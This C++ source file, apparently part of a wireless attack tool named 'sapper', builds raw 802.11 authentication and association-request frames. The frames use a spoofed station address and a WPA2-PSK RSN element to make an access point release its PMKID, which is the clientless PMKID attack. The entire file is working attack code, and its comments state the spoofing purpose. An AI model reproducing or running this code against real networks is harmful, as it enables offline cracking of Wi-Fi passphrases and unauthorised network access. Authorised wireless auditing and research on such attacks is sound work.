/**
 * @file pmkid_solicit.cpp
 * @brief Pure clientless-PMKID solicitation frame builders (ADR-0110). See pmkid_solicit.h.
 */
#include "net/pmkid_solicit.h"

#include <cstring>

namespace sapper {
namespace {

// 802.11 frame-control first byte (version 0). The second byte (flags) is 0 for both frames: an
// injected request from the station we spoof, no ToDS/FromDS.
constexpr uint8_t kFc0MgmtAuth = 0xB0;      // type management, subtype authentication (11).
constexpr uint8_t kFc0MgmtAssocReq = 0x00;  // type management, subtype association request (0).

// RSN information element: one pairwise cipher (CCMP) and one AKM (PSK), the suite a PMK-caching
// WPA2-PSK AP answers with an M1 PMKID KDE.
constexpr uint8_t kRsnIeTag = 0x30;
constexpr uint8_t kRsnOui0 = 0x00, kRsnOui1 = 0x0F, kRsnOui2 = 0xAC;  // 00-0F-AC
constexpr uint8_t kRsnCipherCcmp = 0x04;
constexpr uint8_t kRsnAkmPsk = 0x02;

constexpr uint8_t kSsidIeTag = 0x00;
constexpr uint8_t kRatesIeTag = 0x01;

}  // namespace

const uint8_t* defaultSolicitStaMac() {
    static const uint8_t mac[6] = {0x02, 0xAD, 0x5A, 0x11, 0xED, 0x01};
    return mac;
}

uint16_t buildAuthRequest(uint8_t* buf, size_t bufLen, const uint8_t* bssid, const uint8_t* src) {
    if (buf == nullptr || bssid == nullptr || src == nullptr) return 0;
    if (bufLen < kSolicitAuthFrameLen) return 0;

    uint16_t n = 0;
    buf[n++] = kFc0MgmtAuth; buf[n++] = 0x00;  // frame control.
    buf[n++] = 0x00; buf[n++] = 0x00;          // duration.
    std::memcpy(buf + n, bssid, 6); n += 6;    // addr1 = AP.
    std::memcpy(buf + n, src, 6);   n += 6;    // addr2 = us (spoofed STA).
    std::memcpy(buf + n, bssid, 6); n += 6;    // addr3 = BSSID.
    buf[n++] = 0x00; buf[n++] = 0x00;          // sequence control.
    buf[n++] = 0x00; buf[n++] = 0x00;          // auth algorithm = open system.
    buf[n++] = 0x01; buf[n++] = 0x00;          // auth transaction sequence = 1.
    buf[n++] = 0x00; buf[n++] = 0x00;          // status code = 0.
    return n;
}

uint16_t buildAssocRequest(uint8_t* buf, size_t bufLen, const uint8_t* bssid, const uint8_t* src,
                           const char* ssid) {
    if (buf == nullptr || bssid == nullptr || src == nullptr || ssid == nullptr) return 0;

    const uint8_t ssidLen = static_cast<uint8_t>(strnlen(ssid, kSolicitSsidMaxLen));
    // header(24) + cap(2) + listen(2) + SSID(2+ssidLen) + rates(2+8) + RSN(2+20).
    const size_t required = 24 + 2 + 2 + (2 + ssidLen) + (2 + 8) + (2 + 20);
    if (bufLen < required) return 0;

    uint16_t n = 0;
    buf[n++] = kFc0MgmtAssocReq; buf[n++] = 0x00;  // frame control.
    buf[n++] = 0x00; buf[n++] = 0x00;              // duration.
    std::memcpy(buf + n, bssid, 6); n += 6;        // addr1 = AP.
    std::memcpy(buf + n, src, 6);   n += 6;        // addr2 = us (spoofed STA).
    std::memcpy(buf + n, bssid, 6); n += 6;        // addr3 = BSSID.
    buf[n++] = 0x00; buf[n++] = 0x00;              // sequence control.

    buf[n++] = 0x11; buf[n++] = 0x00;              // capability info: ESS + Privacy.
    buf[n++] = 0x0a; buf[n++] = 0x00;              // listen interval.

    buf[n++] = kSsidIeTag; buf[n++] = ssidLen;     // SSID element.
    std::memcpy(buf + n, ssid, ssidLen); n += ssidLen;

    buf[n++] = kRatesIeTag; buf[n++] = 0x08;       // supported rates: 1,2,5.5,11,6,9,12,18.
    buf[n++] = 0x82; buf[n++] = 0x84; buf[n++] = 0x8b; buf[n++] = 0x96;
    buf[n++] = 0x0c; buf[n++] = 0x12; buf[n++] = 0x18; buf[n++] = 0x24;

    buf[n++] = kRsnIeTag; buf[n++] = 0x14;         // RSN IE, length 20.
    buf[n++] = 0x01; buf[n++] = 0x00;              // version 1.
    buf[n++] = kRsnOui0; buf[n++] = kRsnOui1; buf[n++] = kRsnOui2; buf[n++] = kRsnCipherCcmp;  // group CCMP.
    buf[n++] = 0x01; buf[n++] = 0x00;              // pairwise count 1.
    buf[n++] = kRsnOui0; buf[n++] = kRsnOui1; buf[n++] = kRsnOui2; buf[n++] = kRsnCipherCcmp;  // pairwise CCMP.
    buf[n++] = 0x01; buf[n++] = 0x00;              // AKM count 1.
    buf[n++] = kRsnOui0; buf[n++] = kRsnOui1; buf[n++] = kRsnOui2; buf[n++] = kRsnAkmPsk;       // AKM PSK.
    buf[n++] = 0x00; buf[n++] = 0x00;              // RSN capabilities.
    return n;
}

}  // namespace sapper
